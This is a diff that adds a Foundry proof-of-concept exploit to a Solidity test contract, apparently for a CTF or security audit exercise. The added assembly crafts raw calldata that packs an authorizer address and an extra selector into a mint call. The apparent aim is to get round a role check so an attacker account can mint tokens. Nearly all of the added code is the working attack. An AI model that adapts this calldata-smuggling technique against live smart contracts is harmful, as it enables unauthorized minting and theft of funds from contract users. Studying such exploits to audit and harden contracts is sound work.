@@ -47,6 +47,27 @@ contract PoC is Test {
         vm.startPrank(attacker);
         // -- poc start --
 
+        bytes4 selector1 = MockToken.mint.selector;
+        bytes4 selector2 = 0x3fd40dac; // keccak(selectorRole(bytes4)), selectorRole(MockToken.mint.selector) == 1
+
+        assembly {
+            let p := mload(0x40)
+
+            let r := shl(0x60, sload(rolesAuth.slot))
+            r := or(r, shr(0xA0, selector2))
+
+            mstore(p, selector1)
+            mstore(add(p, 0x04), r)
+            mstore(add(p, 0x24), sload(attacker.slot))
+            mstore(add(p, 0x44), 0x01) // mint 1 token
+
+            let success := call(gas(), sload(token.slot), 0, p, 0x64, 0, 0)
+            if eq(success, 0) { 
+                returndatacopy(p, 0, returndatasize())
+                revert(p, returndatasize())
+            }
+        }
+        
         // -- poc stop --
         __validate();
     }
